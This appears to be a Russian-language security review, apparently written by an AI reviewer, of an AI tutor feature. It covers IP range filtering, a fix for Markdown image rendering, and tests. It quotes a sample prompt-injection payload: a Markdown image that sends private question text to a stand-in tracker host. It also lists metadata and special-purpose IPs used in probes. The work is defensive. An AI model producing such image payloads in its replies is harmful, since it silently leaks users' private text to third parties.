# Независимое safety review M8

Дата: 2026-10-15. Ревьюер: настроенный `gpt-6.1-sol`. Scope: local single-profile, optional provider gateway; платные вызовы не выполнялись. Изменения реализации выполняет другая часть команды; reviewer меняет только этот отчёт. База: M7 рабочее дерево; файлы M8 новые, удалённых исторических security guards нет.

## Результат

Проверены `internal/tutor/**`, `internal/httpapi/tutor.go`, `internal/store/ai_usage.go`, migration0005, `web/src/Tutor.tsx`/CSS; дополнительно startup/env, API middleware/CSP, Vite config и README. **M8-R1 и M8-R2 (оба Medium) исправлены и закрыты после повторного прохода 2026-10-15; открытых High/Medium в проверенной области нет.** Два замечания Low к startup/test harness также исправлены. Обхода согласия, чтения private exam context и полномочий модели над rank/progress в проверенной области не найдено.

## Карта доверия

Браузер → session/Host/Origin/CSRF middleware → bounded DTO/explicit consent → публичный текст выбранного урока и отдельно разрешённый source → redaction → durable budget reserve → server-configured provider → bounded response → numeric ledger и Markdown reply. Провайдер и его текст недоверенные. Endpoint/key/model задаёт оператор env, не браузер; модели не получают tools, DB, runner, profile или exam APIs. Это узкий tutor без автоматической оценки заданий.

## M8-R1 — Medium, CLOSED: IsGlobalUnicast разрешал special-purpose сети

**Путь:** `internal/tutor/gateway.go`, `publicIP`/`publicIPs`/`New`.

Исходный predicate проверял IsGlobalUnicast, Private, Loopback и link-local. В Go IsGlobalUnicast включает100.64.0.0/10 (включая metadata100.100.100.200),198.18.0.0/15 и documentation ranges. Следовательно, конфигурация HTTPS или DNS name могла пройти обещанную public-host проверку с непубличным target. Endpoint выбирает доверенный оператор, TLS проверяется, браузер endpoint не задаёт — это ограничивает exploitability; произвольный remote SSRF не доказан.

**Исправление и evidence:** добавлены deny-prefixes IPv4 и ограничение/deny-prefixes IPv6. Unit `TestDisabledAndInvalidTargets` проверяет special-purpose ranges и принимаемые публичные IP. Отдельный временный probe вызвал New с HTTPS literal IP100.100.100.200,100.64.0.1,198.18.0.1,192.0.2.1,127.0.0.1,169.254.169.254: каждый отклонён до сети. Probe удалён. CLOSED для обнаруженного набора. Публичные адреса фиксируются в DialContext, повторного DNS на вызове нет; Proxy:nil и redirects disabled.

## M8-R2 — Medium, CLOSED: ответ модели загружает сторонние изображения в Vite

**Пути:** `web/src/Tutor.tsx`, `<ReactMarkdown>{reply.text}</ReactMarkdown>`; `web/vite.config.ts`; README описывает запуск Vite.

ReactMarkdown по умолчанию превращает Markdown image в img с внешним src. Недоверенный/скомпрометированный провайдер или prompt injection может вернуть `![tracking](https://tracker.invalid/pixel?question=PRIVATE_TEXT)`. В браузере это автоматически создаёт запрос третьей стороне, хотя пользователь согласился только на выбранного провайдера. Особенно заметно для локального AI, когда UI обещает локальную обработку. API-served production CSP запрещает внешние картинки; документированный Vite dev server CSP не устанавливает, поэтому проблема ограничена этим способом запуска.

**Воспроизводимое evidence:** локальный renderToStaticMarkup с установленными React19/react-markdown10 вывел:

```html
<link rel="preload" as="image" href="https://tracker.invalid/pixel?question=PRIVATE_TEXT"/><p><img src="https://tracker.invalid/pixel?question=PRIVATE_TEXT" alt="tracking"/></p>
```

Сеть при probe не использовалась: это SSR-рендер. Для браузерной проверки подать такой reply от локального mock provider в Vite5173 и перехватить запрос к tracking URL. Фактическую отправку браузера reviewer не запускал.

**Минимальная рекомендация:** запретить img в Tutor Markdown на уровне компонента либо разрешать только inline/проверенные источники; полагаться только на production CSP недостаточно. Тест должен подтверждать отсутствие автоматически загружаемого remote image/preload. Нажимаемые внешние ссылки — отдельное сознательное действие пользователя; они не являются этим дефектом.

**Повторная проверка:** Tutor ReactMarkdown теперь переопределяет img и выводит только span с alt-текстом; src не используется. Ссылки открываются с noopener/noreferrer. Локальный SSR probe с той же component mapping для исходного malicious reply вывел только `<p><span class="tutor-image-suppressed">tracking</span></p>`; проверка на img/preload/tracker URL прошла. Исходный автоматический запрос больше не создаётся независимо от CSP. CLOSED. В `tests/tutor.spec.ts` добавлен browser request listener для tracker.invalid; фактический прогон выполняется родителем и отдельно не засчитывается reviewer до завершения. При чтении теста замечено отсутствие повторного consent.check после смены вопроса; это передано родителю как исправление harness, не как дефект consent UI.

## Исправленные замечания Low

- **Startup endpoint whitespace:** gateway нормализовал Endpoint через TrimSpace, а main повторно делал url.Parse исходного env с игнорированием err; пробел перед endpoint приводил к nil dereference после успешного New. Endpoint теперь нормализуется до обоих вызовов; прочитано повторно. CLOSED.
- **Тест cancellation:** первый запуск `.tools/go/bin/go test -count=1 -timeout=30s ./internal/tutor ./internal/store ./internal/httpapi` завершился FAIL: TestCancellationAndBoundedResponse завис в httptest.Server.Close, handler ожидал только r.Context.Done(). Клиентская отмена уже завершилась. Handler получил отдельный bounded release; полный повторный запуск PASS0.158s для tutor. CLOSED; это дефект test harness, а не доказанная production отмена неработоспособна.

## Проверенные защитные свойства

- Нет provider по умолчанию: пустые endpoint/model оставляют gateway disabled. Cloud HTTPS требует явного operator opt-in; HTTP разрешён только pinned loopback. URL userinfo/query/fragment отвергаются. TLS certificate validation включена, TLS>=1.2.
- POST требует `consent=true`, known mode, message≤2000 runes; source≤8KiB и отдельный share_code. Lesson context — только Body опубликованного каталога≤16KiB, не solution/exam/store. Profile name, attempts, progress, hidden cases, answer keys не загружаются.
- API provider errors обобщены; provider body не возвращается как ошибка; key не входит в settings. Gateway скрывает точное значение своего key в prompt/response/model и common credential patterns. Redaction не обещана как полное распознавание секретов; UI просит проверить текст.
- Один gateway request одновременно на API; резерв до сети. ReserveAI транзакционно суммирует used+reserved и сравнивает daily budget. Pending reserve сохраняется после restart; повторный Finish запрещён.
- Максимум3 provider calls (две primary+одна fallback). Бюджет резервирует4*(message bytes+context bytes+4096+maxoutput). Retry success выставляет Estimated; ошибки/оценки списывают полный reserve. Только успешная первая попытка с корректными positive bounded usage metadata освобождает резерв до фактического reported расхода. Tokens — приблизительная единица контроля, не денежная квота провайдера.
- Gateway timeout20s/attempt, API deadline65s, response≤64KiB; cancel/backoff ограничены. Нет автоматических browser retries, cache возвращается false, сообщения/ответы не пишутся в ledger — только числа/время/status.
- Модель выдаёт только текст. Не вызывает runner, не записывает XP/evidence/rank; система явно сообщает отсутствие полномочий. Hint policy — prompt-level инструкция; гарантировать соблюдение моделью нельзя.

## Тесты и пределы

Фактически выполнено после исправления cancellation harness:

```sh
.tools/go/bin/go test -count=1 -timeout=30s ./internal/tutor ./internal/store ./internal/httpapi
```

PASS: tutor0.158s, store0.174s, httpapi0.029s. Прочитан HTTP mock test `TestTutorConsentBudgetContextAndNoRankAuthority`: no-AI, consent/code consent, redaction, минимальный публичный context, quota denial до provider, unknown rank field и отсутствие XP/award. Store тестирует20 concurrent reservations, persistence, pending reserve и idempotent finish. Gateway тестирует request/model, redaction, bounded retries/fallback, target restrictions, cancellation/oversized response и sanitized errors. Все provider HTTP calls тестов — httptest loopback; платный API не вызывался. Дополнительно выполнены IP admission probe и локальный Markdown SSR probe.

Reviewer не запускал UI browser/E2E, network interception remote images, внешние cloud/TLS endpoints, реальные денежные квоты и полный race-suite M8. Итоговые интеграционные результаты родителя фиксируются отдельно. Провайдер usage metadata доверяется в пределах проверки формата/лимитов; malicious provider billing вне локальных гарантий. Полный IANA special-use registry audit и публичный multi-tenant допуск не заявляются.

Финальный повтор после renderer/startup integration:

```sh
.tools/go/bin/go test -count=1 -timeout=30s ./internal/tutor ./internal/store ./internal/httpapi ./cmd/api
```

PASS: tutor0.158s, store0.173s, httpapi0.028s; cmd/api успешно собирается, собственных tests нет. Startup повторно проверен: trim endpoint до New/Parse, проверка env budget1..1000000/output1..1024, key только gateway, browser settings только label/models/limits, nil Tutor по умолчанию. M7 verdict и его доказательства в EXAM_REVIEW.md этим M8 проходом не изменялись.
